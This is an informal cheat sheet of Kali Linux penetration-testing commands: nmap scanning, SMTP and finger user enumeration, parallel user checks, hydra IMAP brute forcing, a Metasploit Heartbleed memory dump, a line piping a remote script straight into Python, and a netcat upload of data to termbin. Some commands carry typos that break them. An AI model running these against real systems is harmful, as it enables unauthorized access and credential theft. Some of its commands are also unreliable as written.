## Usefull Scripts for Kali Linux

#### Text Uploader:

    echo just testing!  | nc termbin.com 9999
    
#### nmap:
    
    # Scan Server Ports / Footprint
    nmap 192.168.1.101
    # Save to File
    nmap 192.168.1.101 -oN nmap.txt
    # A FULL Scan with a save to xml file
    nmap -oX nmap.xml -p- -T4 -A 192.168.1.101
    # nmap scripts
    ls /usr/share/nmap/scripts/
    # run nmap scripts
    namp -script=http-server-header 192.168.1.101 -p 80,443
    # oident service scan
    nmap --script=auth-owners 192.168.1.101
    # get uniqe list
    nmap --script=auth-owners 192.168.1.101 | grep auth-owners | awk '{print $2}' | sort | uniq >> users.txt
    # check all smtp scripts
    nmap --script=smtp* 192.168.1.101 -p 25
    # heartbleed vulnerable info
    nmap --script=sssl-heartbleed 19.168.1.101
    
####  Login into Sockets
    
    # Login for example to ftp Server 
    # (READ Banner message to get service which is runnung)
    nc 192.168.1.101 21

#### NC Example
    
    # communicate with imap for example
    # with auth you can "bruteforce" for users
    nc 192.168.1.101 110
    USER admin
    +OK Name is a valid mailbox
    PASS password
    -ERR [AUTH] invalid password
    
    # Finger service
    nc 192.168.1.101 79
    root admin mail
    finger: root: no such user
    finger: admin: no such user
    finger: mail: no such user
    
    # SMTP Infos
    nc 192.168.1.101 25
    220 localhost ESMTP Postfix (Debian/GNU)
    EHLO hacker
    250-localhost
    250-PIPELINING
    250-SIZE 10240000
    250-VRFY
    250-ETRN
    250-STARTTLS
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250 DSN
    VRFY admin  # Valid User! ;)
    252 2.0.0 admin
    VRFY hacker
    550 5.1.1 <hacker>: Recipient address rejected: User unknown in local recipient table
    MAIL FROM: <root@mailserver>
    250 2.1.0 Ok
    RCPT TO: fakefake@localhost
    550 5.1.1 <fakefake@localhost>: Recipient address rejected: User unknown in local recipient table
    RCPT TO: fakefake@gmail.com  # Relay Check (if denied not goot as spam server)
    454 4.7.1 <fakefake@gmail.com>: Relay access denied
    RCPT TO: admin@localhost
    250 2.1.0 Ok  # Accept Mail?
    
#### "Service Wikipedia"
    
    man hydra
    
#### Finger Service

    # Check at Finger service if user is valid
    finger vmail@192.168.1.1
    
#### Bruteforce
    
    # Valid Shell Users
    # Bruteforce in parallel tasks with 10 threads
    cat names.txt | parallel -j 10 finger {}@192.168.1.1
    # just valid users
    cat names.txt | parallel -j 10 finger {}@192.168.1.1 | grep -v "no such user."
    
    # IMAP Bruteforce
    hydra -L usernames.txt -P wordlist.txt 192.168.1.1 imap
    
#### MSF Console
    
    # example heartbleed
    msfconsole
    > search heartbleed
    > use auxiliary/scanner/ssl/openssl/openssl_heartbleed
    > info
    > show options
    > SET RHPSTS 192.168.1.1
    > exploit
    > SET ACTION DUMP
    > run
    > strings [file]
    
    
#### Other Things

    # Save XML as HTML
    xsltproc nmap.xml --output nmap.html
    # Nmap Script GUI from MyHackerHouse.com
    curl http://static.myhackerhouse.com/stuff/nsediscover.py | python -
    # Generate name list like NAME_A
    for name in `cat names.txt`; do for x in {a..z}; do echo $name'_'$x >> name_long.txt; done; done;
    # Search for Kali Sploits
    searchsploit ftp
        
#### Tipps
- Check Webserver (what is running on, get new infos maybe email strcture?)
- has SSL?
- check for vulnerability http://www.securityfocus.com/bid
- https://vimeo.com/199741114